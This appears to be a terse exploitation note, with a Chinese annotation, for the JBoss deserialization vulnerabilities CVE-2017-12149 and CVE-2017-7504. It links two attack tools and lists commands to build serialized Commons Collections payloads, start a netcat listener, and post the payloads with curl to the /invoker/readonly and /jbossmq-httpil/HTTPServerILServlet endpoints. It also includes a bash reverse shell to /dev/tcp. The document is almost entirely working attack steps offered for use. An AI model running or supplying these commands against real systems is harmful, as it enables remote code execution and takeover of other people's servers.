https://github.com/joaomatosf/JavaDeserH2HC
https://github.com/joaomatosf/jexboss



CVE-2017-12149:
cd JavaDeserH2HC

javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java

java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java ip:port (nc监听IP及端口）

nc -l -vv -p port

curl http://xxxxx:8080/invoker/readonly –data-binary @ReverseShellCommonsCollectionsHashMap.ser



CVE-2017-7504:
cd JavaDeserH2HC

javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1.java

java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1 '/bin/bash -i&>&/dev/tcp/ip/port<&1'

nc -l -vv -p port

curl http://xxxxx:8080/jbossmq-httpil/HTTPServerILServlet –data-binary @ExampleCommonsCollections1.ser
